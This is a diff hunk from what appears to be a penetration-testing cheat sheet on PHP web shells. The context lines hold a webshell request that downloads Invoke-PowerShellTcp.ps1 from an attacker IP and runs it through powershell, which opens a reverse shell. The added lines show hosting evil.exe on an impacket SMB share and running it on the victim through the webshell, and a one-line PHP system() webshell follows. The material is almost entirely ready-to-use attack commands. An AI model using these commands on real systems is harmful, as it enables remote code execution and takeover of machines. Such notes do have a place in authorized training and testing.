@@ -16,6 +16,12 @@ EOL;
 #Unique way to call powershell using this shell (the trailing 'dash' runs from STDIN - much like 'cat script.sh |bash -s' in Linux):
 http://victim/webshell.php?vexec=echo IEX(New-Object Net.WebClient).downloadString('http://MY.SER.VER.IP:8080/Invoke-PowerShellTcp.ps1') |powershell -noprofile - 
 
+#Execution from SMB Share directly - without having to upload a file to the victim system
+#On Attacking Machine(starts a server that hosts the exe to be executed):
+impacket-smbserver figment evil.exe
+#On victim at webshell:
+http://victim/webshell.php?vexec=\\MY.SER.VER.IP\figment\evil.exe whoami
+
 #taken from: https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html
 # Execute one command
 <?php system("whoami"); ?>
